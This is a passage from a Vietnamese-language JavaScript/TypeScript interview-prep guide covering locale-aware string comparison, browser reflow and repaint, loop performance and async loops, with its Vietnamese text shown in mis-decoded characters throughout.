const bad3 = 'NGUYá»„N'.toLowerCase() === 'nguyá»…n'; // âœ… true (OK)
const bad4 = 'Ä°stanbul'.toLowerCase() === 'istanbul'; // âŒ false (Turkish)

// âœ… ÄÃšNG: DÃ¹ng toLocaleLowerCase() vá»›i locale
const good3 = 'Ä°stanbul'.toLocaleLowerCase('tr') === 'istanbul'; // âœ… true

// âŒ Lá»–I 4: localeCompare trong loop lá»›n
const badArray = bigArray.sort((a, b) => a.localeCompare(b, 'vi')); // âŒ Cháº­m

// âœ… ÄÃšNG: Táº¡o Collator trÆ°á»›c
const collator = new Intl.Collator('vi');
const goodArray = bigArray.sort((a, b) => collator.compare(a, b)); // âœ… Nhanh hÆ¡n
```

**ğŸ“Š So SÃ¡nh CÃ¡c PhÆ°Æ¡ng PhÃ¡p:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PhÆ°Æ¡ng PhÃ¡p          â”‚ Performance    â”‚ Tiáº¿ng Viá»‡t   â”‚ Case/Accent     â”‚ Use Case     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ === / < / >          â”‚ âš¡âš¡âš¡âš¡âš¡       â”‚ âŒ           â”‚ PhÃ¢n biá»‡t       â”‚ ASCII only   â”‚
â”‚ toLowerCase() + ===  â”‚ âš¡âš¡âš¡âš¡         â”‚ âŒ           â”‚ KhÃ´ng phÃ¢n biá»‡t â”‚ Simple       â”‚
â”‚ localeCompare()      â”‚ âš¡âš¡âš¡          â”‚ âœ…           â”‚ TÃ¹y chá»‰nh       â”‚ 1-2 láº§n      â”‚
â”‚ Intl.Collator        â”‚ âš¡âš¡âš¡âš¡âš¡       â”‚ âœ…           â”‚ TÃ¹y chá»‰nh       â”‚ Sort, nhiá»u  â”‚
â”‚ normalize() + ===    â”‚ âš¡âš¡âš¡âš¡         â”‚ Partial      â”‚ TÃ¹y chá»‰nh       â”‚ Unicode fix  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**âœ… Tá»•ng Káº¿t:**

- **So sÃ¡nh ASCII**: DÃ¹ng `===`, `<`, `>`
- **So sÃ¡nh tiáº¿ng Viá»‡t (1-2 láº§n)**: DÃ¹ng `localeCompare()`
- **Sort/Search tiáº¿ng Viá»‡t (nhiá»u láº§n)**: DÃ¹ng `Intl.Collator`
- **Unicode variants**: DÃ¹ng `normalize('NFC')` hoáº·c `normalize('NFD')`
- **Fuzzy search**: Remove accents vá»›i `normalize('NFD')` + regex

</details>

## **Pháº§n 9: Advanced Topics**

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ¨ Q24: Browser Rendering (Paint, Repaint, Reflow)</span></summary>


**âš¡ Quick Summary:**
> Reflow = recalculate layout (expensive). Repaint = redraw pixels. Paint = first render

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¨ **Paint**: First render lÃªn screen
- ğŸ”„ **Reflow**: Recalculate layout (DOM thay Ä‘á»•i size/position)
- ğŸ–Œï¸ **Repaint**: Redraw pixels (color, visibility change)
- âš¡ **Optimize**: Batch DOM changes, use transform/opacity, requestAnimationFrame

**Tráº£ lá»i:**

- **Paint**: Váº½ pixels lÃªn screen
- **Repaint**: Váº½ láº¡i elements vá»›i same layout
- **Reflow**: Recalculate layout vÃ  repaint
- **Hoáº¡t Ä‘á»™ng**: Reflow â†’ Repaint â†’ Composite
- **Æ¯u Ä‘iá»ƒm**: Optimized rendering, smooth animations
- **NhÆ°á»£c Ä‘iá»ƒm**: Reflow expensive, cÃ³ thá»ƒ gÃ¢y performance issues

**Code Example:**

```typescript
// Reflow triggers
function triggerReflow(): void {
  const element = document.getElementById('myElement');
  if (element) {
    // These trigger reflow
    element.style.width = '200px';
    element.style.height = '100px';
    element.style.margin = '10px';
    element.style.padding = '5px';

    // Reading layout properties also triggers reflow
    const width = element.offsetWidth;
    const height = element.offsetHeight;
  }
}

// Optimized - batch DOM changes
function optimizedReflow(): void {
  const element = document.getElementById('myElement');
  if (element) {
    // Batch all changes
    element.style.cssText =
      'width: 200px; height: 100px; margin: 10px; padding: 5px;';

    // Or use class
    element.className = 'new-style';
  }
}

// Use transform for animations (trÃ¡nh reflow)
function animateWithTransform(): void {
  const element = document.getElementById('myElement');
  if (element) {
    // Transform doesn't trigger reflow
    element.style.transform = 'translateX(100px)';
    element.style.transition = 'transform 0.3s ease';
  }
}
```

**Best Practices:**

- TrÃ¡nh reflow khi cÃ³ thá»ƒ
- Sá»­ dá»¥ng transform cho animations
- Sá»­ dá»¥ng requestAnimationFrame
- Batch DOM changes

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ” Q25: Loop Performance & Async Loops</span></summary>


**âš¡ Quick Summary:**
> for loop = fastest. forEach = readable. map/filter = functional. Async loops = Promise.all hoáº·c for await

**ğŸ’¡ Ghi Nhá»›:**
- âš¡ **Performance**: for > for...of > forEach > map
- ğŸ”„ **Async**: DÃ¹ng `for await...of` hoáº·c `Promise.all()`
- âš ï¸ **Trap**: forEach khÃ´ng work vá»›i async/await!

**Tráº£ lá»i:**

CÃ³ nhiá»u cÃ¡ch Ä‘á»ƒ loop qua array/object trong JavaScript, má»—i cÃ¡ch cÃ³ performance vÃ  behavior khÃ¡c nhau:

**ğŸ”„ CÃ¡c loáº¡i Loops & Performance:**

1. **`for` loop** - Nhanh nháº¥t âš¡

   - Performance: â­â­â­â­â­ (fastest)
   - Control: Full control (break, continue)
   - Use case: Performance-critical code, large arrays

2. **`for...of`** - Modern, readable ğŸ“–

   - Performance: â­â­â­â­ (slower than for, faster than forEach)
   - Control: Support break, continue
   - Use case: Readable code, iterables (Array, Set, Map, String)

3. **`forEach`** - Functional style ğŸ¨

   - Performance: â­â­â­ (slowest - function call overhead)
   - Control: KHÃ”NG support break, continue
   - Use case: Functional programming, side effects

4. **`for...in`** - Cho objects ğŸ”‘

   - Performance: â­â­ (slow - prototype chain lookup)
   - Control: Support break, continue
   - Use case: Iterate object keys (KHÃ”NG nÃªn dÃ¹ng cho arrays)

5. **`map/filter/reduce`** - Functional transformations ğŸ”„
   - Performance: â­â­â­ (similar to forEach)
   - Control: KHÃ”NG support break (pháº£i loop háº¿t array)
   - Use case: Transform data, create new arrays

**âš ï¸ QUAN TRá»ŒNG: Async/Await trong Loops**

**Sequential vs Parallel execution:**

- **Sequential**: Chá» tá»«ng promise xong má»›i cháº¡y tiáº¿p (slow but controlled)
- **Parallel**: Cháº¡y táº¥t cáº£ promises cÃ¹ng lÃºc (fast but less control)

**Hoáº¡t Ä‘á»™ng:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚           LOOP PERFORMANCE COMPARISON                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                        â”‚
â”‚  Synchronous Performance (1M items):                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”‚
â”‚  â”‚  for loop:        ~2ms   âš¡âš¡âš¡âš¡âš¡    â”‚             â”‚
â”‚  â”‚  for...of:        ~5ms   âš¡âš¡âš¡âš¡      â”‚             â”‚
â”‚  â”‚  forEach:         ~8ms   âš¡âš¡âš¡        â”‚             â”‚
â”‚  â”‚  map:            ~10ms   âš¡âš¡âš¡        â”‚             â”‚
â”‚  â”‚  for...in:       ~50ms   âš¡          â”‚             â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚
â”‚                                                        â”‚
â”‚  Async Execution (3 items, 1s delay each):           â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”             â”‚
â”‚  â”‚  Sequential (for/for...of): ~3s      â”‚             â”‚
â”‚  â”‚  â”œâ”€ Item 1: 1s â”â”â”â”â”â”â”â”â”â”â”          â”‚             â”‚
â”‚  â”‚  â”œâ”€ Item 2: 1s           â”â”â”â”â”â”â”â”â”â”â”â”‚             â”‚
â”‚  â”‚  â””â”€ Item 3: 1s                     â”â”â”‚             â”‚
â”‚  â”‚                                                    â”‚             â”‚
â”‚  â”‚  Parallel (Promise.all):   ~1s       â”‚             â”‚
â”‚  â”‚  â”œâ”€ Item 1: 1s â”â”â”â”â”â”â”â”â”â”â”          â”‚             â”‚
â”‚  â”‚  â”œâ”€ Item 2: 1s â”â”â”â”â”â”â”â”â”â”â”¤          â”‚             â”‚
â”‚  â”‚  â””â”€ Item 3: 1s â”â”â”â”â”â”â”â”â”â”â”˜          â”‚             â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜             â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Æ¯u Ä‘iá»ƒm:**

- âœ… **for loop**: Nhanh nháº¥t, full control (break/continue), cache length
- âœ… **for...of**: Modern, readable, support break/continue, work vá»›i iterables
- âœ… **forEach**: Functional style, chain methods, readable
- âœ… **Async for...of**: Sequential execution, dá»… control
- âœ… **Promise.all**: Parallel execution, nhanh nháº¥t cho async

**NhÆ°á»£c Ä‘iá»ƒm:**

- âŒ **for loop**: Verbose, dá»… lá»—i (index out of bounds)
- âŒ **for...of**: Cháº­m hÆ¡n for loop ~2-3x
- âŒ **forEach**: Cháº­m nháº¥t, KHÃ”NG support break/continue, KHÃ”NG support async/await
- âŒ **for...in**: Ráº¤T cháº­m, iterate prototype chain, KHÃ”NG nÃªn dÃ¹ng cho arrays
- âŒ **Async sequential**: Cháº­m (chá» tá»«ng promise), khÃ´ng táº­n dá»¥ng concurrency

**ChÃº thÃ­ch:**

**ğŸ”„ Loop Control Keywords:**

- **`break`**: ThoÃ¡t loop ngay láº­p tá»©c
- **`continue`**: Skip iteration hiá»‡n táº¡i, tiáº¿p tá»¥c iteration tiáº¿p theo
- **`return`**: ThoÃ¡t function (KHÃ”NG chá»‰ loop)

**âš¡ Performance Tips:**

- Cache array length: `const len = arr.length` â†’ trÃ¡nh re-calculate má»—i iteration
- Avoid nested loops: O(nÂ²) â†’ ráº¥t cháº­m vá»›i large arrays
- Use `for` loop cho performance-critical code (>10K items)
- Use `for...of` cho readable code (trade-off: ~2-3x slower)

**ğŸ” Async/Await Behavior:**

- `for`/`for...of`: Support `await` â†’ **sequential** execution
- `forEach`: KHÃ”NG support `await` Ä‘Ãºng cÃ¡ch â†’ callbacks cháº¡y **parallel** nhÆ°ng khÃ´ng Ä‘á»£i
- `map` + `Promise.all`: Best practice cho **parallel** async operations
- `for await...of`: DÃ nh cho **async iterables** (streams, generators)

**Code Example (TypeScript):**

```typescript
// ============================================
// 1. SYNCHRONOUS LOOPS - Performance Comparison
// ============================================

const numbers = [1, 2, 3, 4, 5];

// ğŸš€ A. for loop - FASTEST (traditional)
console.time('for loop');
for (let i = 0; i < numbers.length; i++) {
  console.log(numbers[i]);
}
console.timeEnd('for loop'); // ~0.1ms

// ğŸš€ B. for loop - OPTIMIZED (cache length)
console.time('for loop optimized');
const len = numbers.length; // âœ… Cache length
for (let i = 0; i < len; i++) {
  console.log(numbers[i]);
}
console.timeEnd('for loop optimized'); // ~0.08ms (faster)

// ğŸ“– C. for...of - MODERN & READABLE
console.time('for...of');
for (const number of numbers) {
  console.log(number);
  // âœ… Support break, continue
  if (number === 3) break;
}
console.timeEnd('for...of'); // ~0.2ms (2x slower than for)

// ğŸ¨ D. forEach - FUNCTIONAL STYLE
console.time('forEach');
numbers.forEach((number, index) => {
  console.log(number);
  // âŒ CANNOT use break or continue!
  // if (number === 3) break; // âŒ SyntaxError
});
console.timeEnd('forEach'); // ~0.3ms (slowest)

// ğŸ”‘ E. for...in - FOR OBJECTS (KHÃ”NG nÃªn dÃ¹ng cho arrays!)
const obj = { a: 1, b: 2, c: 3 };
console.time('for...in');
for (const key in obj) {
  if (obj.hasOwnProperty(key)) {
    // âœ… Check own properties
    console.log(key, obj[key]);
  }
}
console.timeEnd('for...in'); // ~0.5ms (ráº¥t cháº­m vá»›i arrays)

// âŒ BAD: for...in vá»›i array
const arr = [1, 2, 3];
for (const index in arr) {
  console.log(index); // '0', '1', '2' (STRING, khÃ´ng pháº£i number!)
}

// ğŸ”„ F. map/filter/reduce - FUNCTIONAL TRANSFORMATIONS
console.time('map');
const doubled = numbers.map((n) => n * 2); // [2, 4, 6, 8, 10]
console.timeEnd('map'); // ~0.3ms

const evens = numbers.filter((n) => n % 2 === 0); // [2, 4]
const sum = numbers.reduce((acc, n) => acc + n, 0); // 15

// ============================================
// 2. PERFORMANCE TEST - Large Arrays
// ============================================

function performanceTest(): void {
  const largeArray = Array.from({ length: 1_000_000 }, (_, i) => i);
  let result = 0;

  // ğŸš€ for loop - FASTEST
  console.time('for loop (1M items)');
  const len = largeArray.length;
  for (let i = 0; i < len; i++) {
    result += largeArray[i];
  }
  console.timeEnd('for loop (1M items)'); // ~2ms

  // ğŸ“– for...of
  result = 0;
  console.time('for...of (1M items)');
  for (const item of largeArray) {
    result += item;
  }
  console.timeEnd('for...of (1M items)'); // ~5ms (2.5x slower)

  // ğŸ¨ forEach
  result = 0;
  console.time('forEach (1M items)');
  largeArray.forEach((item) => {
    result += item;
  });
  console.timeEnd('forEach (1M items)'); // ~8ms (4x slower)

  // ğŸ”„ reduce
  console.time('reduce (1M items)');
  result = largeArray.reduce((acc, item) => acc + item, 0);
  console.timeEnd('reduce (1M items)'); // ~10ms (5x slower)

  console.log('Result:', result);
}

performanceTest();

// ============================================
// 3. ASYNC/AWAIT trong LOOPS - QUAN TRá»ŒNG! âš ï¸
// ============================================

// Mock API call (1 giÃ¢y delay)
async function fetchUserData(userId: number): Promise<string> {
  console.log(`ğŸš€ Báº¯t Ä‘áº§u fetch user ${userId}...`);
  await new Promise((resolve) => setTimeout(resolve, 1000)); // 1s delay
  console.log(`âœ… HoÃ n thÃ nh fetch user ${userId}`);
  return `User ${userId} data`;
}

const userIds = [1, 2, 3];

// âŒ BAD: forEach vá»›i async/await - KHÃ”NG HOáº T Äá»˜NG ÄÃšNG!
async function badForEach() {
  console.log('âŒ BAD: forEach vá»›i async/await');
  console.time('forEach async');

  userIds.forEach(async (id) => {
    const data = await fetchUserData(id); // âŒ await bá»‹ IGNORE!
    console.log(data);
  });

  console.timeEnd('forEach async'); // ~0ms (KHÃ”NG Ä‘á»£i promises!)
  console.log('forEach done (nhÆ°ng chÆ°a fetch xong!)');

  // ğŸš¨ Váº¥n Ä‘á»:
  // - forEach KHÃ”NG Ä‘á»£i async callbacks
  // - Táº¥t cáº£ promises cháº¡y parallel nhÆ°ng khÃ´ng control Ä‘Æ°á»£c
  // - console.log 'done' cháº¡y TRÆ¯á»šC khi fetch xong
}

// âœ… GOOD: for...of vá»›i async/await - SEQUENTIAL (Tuáº§n tá»±)
async function goodSequential() {
  console.log('âœ… GOOD: for...of - Sequential execution');
  console.time('for...of sequential');

  for (const id of userIds) {
    const data = await fetchUserData(id); // âœ… Äá»£i tá»«ng promise xong
    console.log(data);
  }

  console.timeEnd('for...of sequential'); // ~3s (1s Ã— 3)
  console.log('Sequential done!');

  // âœ… Hoáº¡t Ä‘á»™ng:
  // 1s: Fetch user 1 â†’ Ä‘á»£i xong
  // 1s: Fetch user 2 â†’ Ä‘á»£i xong
  // 1s: Fetch user 3 â†’ Ä‘á»£i xong
  // Total: 3s
}

// âœ… BETTER: Promise.all - PARALLEL (Song song)
async function goodParallel() {
  console.log('âœ… BETTER: Promise.all - Parallel execution');
  console.time('Promise.all parallel');

  const promises = userIds.map((id) => fetchUserData(id));
  const results = await Promise.all(promises); // âœ… Cháº¡y song song

  results.forEach((data) => console.log(data));

  console.timeEnd('Promise.all parallel'); // ~1s (3 requests cÃ¹ng lÃºc!)
  console.log('Parallel done!');

  // âœ… Hoáº¡t Ä‘á»™ng:
  // 0s: Khá»Ÿi táº¡o 3 promises cÃ¹ng lÃºc
  // 1s: Cáº£ 3 promises resolve cÃ¹ng lÃºc
  // Total: 1s (NHANH Gáº¤P 3 Láº¦N!)
}

// âœ… ADVANCED: for...of vá»›i batch processing
async function goodBatch() {
  console.log('âœ… ADVANCED: Batch processing');
  console.time('Batch processing');

  const batchSize = 2; // Cháº¡y 2 requests cÃ¹ng lÃºc

  for (let i = 0; i < userIds.length; i += batchSize) {
    const batch = userIds.slice(i, i + batchSize);
    const promises = batch.map((id) => fetchUserData(id));
    const results = await Promise.all(promises); // Äá»£i batch xong

    results.forEach((data) => console.log(data));
  }

  console.timeEnd('Batch processing'); // ~2s
  console.log('Batch done!');

  // âœ… Hoáº¡t Ä‘á»™ng:
  // Batch 1 (users 1, 2): 1s parallel
  // Batch 2 (user 3):      1s
  // Total: 2s (balance giá»¯a speed & control)
}

// ============================================
// 4. ASYNC LOOPS - Real-world Trading Example
// ============================================

interface Order {
  id: number;
  symbol: string;
  quantity: number;
}

// Mock API: Submit order to exchange
async function submitOrder(order: Order): Promise<string> {
  console.log(`ğŸ“¤ Submitting order ${order.id}: ${order.symbol}...`);
  await new Promise((resolve) => setTimeout(resolve, 500)); // 500ms delay
  return `Order ${order.id} confirmed`;
}

const orders: Order[] = [
  { id: 1, symbol: 'AAPL', quantity: 100 },
  { id: 2, symbol: 'GOOGL', quantity: 50 },
  { id: 3, symbol: 'MSFT', quantity: 75 },
];

// âŒ SCENARIO 1: Sequential (cháº­m nhÆ°ng an toÃ n)
async function submitOrdersSequential() {
  console.log('ğŸ“Š Submitting orders SEQUENTIALLY...');
  console.time('Sequential orders');

  for (const order of orders) {
    const result = await submitOrder(order); // Äá»£i tá»«ng order
    console.log(`âœ… ${result}`);

    // âœ… CÃ³ thá»ƒ handle errors tá»«ng order:
    // if (error) continue; // Skip order lá»—i, cháº¡y tiáº¿p
  }

  console.timeEnd('Sequential orders'); // ~1.5s (500ms Ã— 3)

  // ğŸ’¡ Use case:
  // - Orders phá»¥ thuá»™c nhau (order 2 cáº§n order 1 xong)
  // - Rate limiting (khÃ´ng gá»­i quÃ¡ nhiá»u requests)
  // - Error handling riÃªng tá»«ng order
}

// âœ… SCENARIO 2: Parallel (nhanh nhÆ°ng rá»§i ro)
async function submitOrdersParallel() {
  console.log('ğŸš€ Submitting orders PARALLEL...');
  console.time('Parallel orders');

  const promises = orders.map((order) => submitOrder(order));
  const results = await Promise.all(promises); // Táº¥t cáº£ cÃ¹ng lÃºc

  results.forEach((result) => console.log(`âœ… ${result}`));

  console.timeEnd('Parallel orders'); // ~500ms (táº¥t cáº£ cÃ¹ng lÃºc!)

  // ğŸ’¡ Use case:
  // - Orders Ä‘á»™c láº­p (khÃ´ng phá»¥ thuá»™c nhau)
  // - Muá»‘n nhanh nháº¥t
  // - Exchange support concurrent requests

  // âš ï¸ Rá»§i ro:
  // - 1 order lá»—i â†’ Promise.all reject (táº¥t cáº£ fail)
  // - CÃ³ thá»ƒ vÆ°á»£t rate limit
}

// âœ… SCENARIO 3: Parallel with error handling
async function submitOrdersParallelSafe() {
  console.log('ğŸ›¡ï¸ Submitting orders PARALLEL (safe)...');
  console.time('Parallel safe orders');

  const promises = orders.map(async (order) => {
    try {
      const result = await submitOrder(order);
      return { status: 'fulfilled', value: result };
    } catch (error) {
      return { status: 'rejected', reason: error };
    }
  });

  const results = await Promise.all(promises);

  results.forEach((result, index) => {
    if (result.status === 'fulfilled') {
      console.log(`âœ… ${result.value}`);
    } else {
      console.log(`âŒ Order ${orders[index].id} failed:`, result.reason);
    }
  });

  console.timeEnd('Parallel safe orders');

  // âœ… Lá»£i Ã­ch:
  // - Nhanh (parallel)
  // - 1 order lá»—i KHÃ”NG áº£nh hÆ°á»Ÿng orders khÃ¡c
  // - Handle errors riÃªng tá»«ng order
}

// Alternative: Promise.allSettled
async function submitOrdersAllSettled() {
  console.log('âœ¨ Using Promise.allSettled...');
  console.time('allSettled orders');

  const promises = orders.map((order) => submitOrder(order));
  const results = await Promise.allSettled(promises); // âœ… KHÃ”NG reject khi cÃ³ lá»—i

  results.forEach((result, index) => {
    if (result.status === 'fulfilled') {
      console.log(`âœ… ${result.value}`);
    } else {
      console.log(`âŒ Order ${orders[index].id} failed:`, result.reason);
    }
  });

  console.timeEnd('allSettled orders');
}

// ============================================
// 5. LOOP CONTROL - break, continue, return
// ============================================

function loopControl() {
  const numbers = [1, 2, 3, 4, 5];

  // âœ… break: ThoÃ¡t loop ngay láº­p tá»©c
  console.log('--- break example ---');
  for (const num of numbers) {
    if (num === 3) break; // Dá»«ng khi gáº·p 3
    console.log(num); // 1, 2
  }

  // âœ… continue: Skip iteration hiá»‡n táº¡i
  console.log('--- continue example ---');
  for (const num of numbers) {
    if (num === 3) continue; // Skip 3
    console.log(num); // 1, 2, 4, 5
  }

  // âœ… return: ThoÃ¡t function (KHÃ”NG chá»‰ loop!)
  console.log('--- return example ---');
  function findNumber(target: number): string {
    for (const num of numbers) {
      if (num === target) {
        return `Found ${target}`; // ThoÃ¡t function
      }
    }
    return 'Not found';
  }
  console.log(findNumber(3)); // 'Found 3'

  // âŒ forEach: CANNOT use break/continue/return
  console.log('--- forEach (no control) ---');
  numbers.forEach((num) => {
    // if (num === 3) break;    // âŒ SyntaxError
    // if (num === 3) continue; // âŒ SyntaxError
    if (num === 3) return; // âœ… OK nhÆ°ng chá»‰ skip iteration nÃ y (nhÆ° continue)
    console.log(num); // 1, 2, 4, 5
  });
}

loopControl();
```

---

**Best Practices:**

1. **Chá»n Loop Type Ä‘Ãºng Use Case**

   ```typescript
   // âš¡ Performance-critical (>100K items)
   for (let i = 0; i < arr.length; i++) {}

   // ğŸ“– Readable code (<100K items)
   for (const item of arr) {
   }

   // ğŸ¨ Functional transformations
   const doubled = arr.map((x) => x * 2);

   // ğŸ”‘ Objects only
   for (const key in obj) {
   }
   ```

2. **Cache Array Length**

   ```typescript
   // âŒ BAD: Re-calculate length má»—i iteration
   for (let i = 0; i < arr.length; i++) {}

   // âœ… GOOD: Cache length
   const len = arr.length;
   for (let i = 0; i < len; i++) {}
   ```

3. **Async/Await Ä‘Ãºng cÃ¡ch**

   ```typescript
   // âŒ NEVER use forEach vá»›i async/await
   arr.forEach(async (item) => {
     await doSomething(item); // KHÃ”NG Ä‘á»£i!
   });

   // âœ… Sequential: for...of + await
   for (const item of arr) {
     await doSomething(item); // Äá»£i tá»«ng cÃ¡i
   }

   // âœ… Parallel: Promise.all
   await Promise.all(arr.map((item) => doSomething(item)));
   ```

4. **Avoid Nested Loops (O(nÂ²))**

   ```typescript
   // âŒ BAD: O(nÂ²) - Ráº¤T CHáº¬M
   for (const item1 of arr1) {
     for (const item2 of arr2) {
       // ...
     }
   }

   // âœ… GOOD: Use Map/Set O(n)
   const map = new Map(arr2.map((item) => [item.id, item]));
   for (const item1 of arr1) {
     const item2 = map.get(item1.id); // O(1) lookup
   }
   ```

5. **Error Handling trong Async Loops**

   ```typescript
   // âœ… Sequential: try/catch tá»«ng operation
   for (const item of items) {
     try {
       await process(item);
     } catch (error) {
       console.error(`Failed to process ${item}:`, error);
       continue; // Skip lá»—i, cháº¡y tiáº¿p
     }
   }

   // âœ… Parallel: Promise.allSettled
   const results = await Promise.allSettled(items.map((item) => process(item)));
   ```

---

**Common Mistakes:**

1. **âŒ forEach vá»›i async/await**

   ```typescript
   // âŒ BAD: await bá»‹ IGNORE!
   items.forEach(async (item) => {
     await fetchData(item); // KHÃ”NG Ä‘á»£i!
   });
   console.log('Done'); // Cháº¡y TRÆ¯á»šC khi fetch xong!

   // âœ… GOOD: DÃ¹ng for...of
   for (const item of items) {
     await fetchData(item); // Äá»£i Ä‘Ãºng
   }
   ```

2. **âŒ for...in vá»›i Arrays**

   ```typescript
   // âŒ BAD: index lÃ  STRING, iterate prototype
   const arr = [1, 2, 3];
   for (const index in arr) {
     console.log(typeof index); // 'string'!
   }

   // âœ… GOOD: DÃ¹ng for...of
   for (const value of arr) {
     console.log(value); // 1, 2, 3
   }
   ```

3. **âŒ KhÃ´ng Cache Length**

   ```typescript
   // âŒ BAD: arr.length tÃ­nh láº¡i má»—i iteration
   for (let i = 0; i < arr.length; i++) {}

   // âœ… GOOD: Cache length
   const len = arr.length;
   for (let i = 0; i < len; i++) {}
   ```

4. **âŒ Nested Loops O(nÂ²)**

   ```typescript
   // âŒ BAD: 1000 Ã— 1000 = 1,000,000 iterations!
   for (const user of users) {
     // 1000 users
     for (const order of orders) {
       // 1000 orders
       if (order.userId === user.id) {
       }
     }
   }

   // âœ… GOOD: O(n) vá»›i Map
   const ordersByUser = new Map();
   orders.forEach((order) => {
     if (!ordersByUser.has(order.userId)) {
       ordersByUser.set(order.userId, []);
     }
     ordersByUser.get(order.userId).push(order);
   });

   users.forEach((user) => {
     const userOrders = ordersByUser.get(user.id); // O(1)
   });
   ```

5. **âŒ Promise.all mÃ  khÃ´ng handle errors**

   ```typescript
   // âŒ BAD: 1 promise fail â†’ Táº¤T Cáº¢ fail
   await Promise.all(items.map((item) => fetchData(item)));

   // âœ… GOOD: DÃ¹ng Promise.allSettled
   const results = await Promise.allSettled(
     items.map((item) => fetchData(item))
   );

   results.forEach((result, i) => {
     if (result.status === 'rejected') {
       console.error(`Item ${i} failed:`, result.reason);
     }
   });
   ```

---
</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ’¾ Q26: Handle Caching - HTTP Caching & Browser Cache Strategies</span></summary>


**âš¡ Quick Summary:**
> HTTP Cache = Cache-Control, ETag. Browser Cache = disk/memory cache. Service Worker = offline cache

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ“¦ **Cache-Control**: max-age, no-cache, no-store
- ğŸ·ï¸ **ETag**: Validation token cho conditional requests
- ğŸ’¾ **Storage**: localStorage (persist), sessionStorage (tab), Cache API (PWA)

**Tráº£ lá»i:**

- **HTTP Caching**: CÆ¡ cháº¿ lÆ°u trá»¯ responses Ä‘á»ƒ trÃ¡nh táº£i láº¡i resources, giáº£m latency vÃ  bandwidth
- **Cache Types**: Browser Cache, Service Worker Cache, Memory Cache, Disk Cache, CDN Cache
- **Cache Headers**: Cache-Control, ETag, Last-Modified, Expires, Vary
- **ğŸ”¥ Æ¯u Ä‘iá»ƒm**: TÄƒng tá»‘c Ä‘á»™ load page, giáº£m server load, tiáº¿t kiá»‡m bandwidth, cáº£i thiá»‡n UX
- **âš ï¸ NhÆ°á»£c Ä‘iá»ƒm**: CÃ³ thá»ƒ serve stale data, phá»©c táº¡p khi manage cache invalidation, storage limitations

**ğŸ¯ HTTP Cache Headers & Directives:**

```
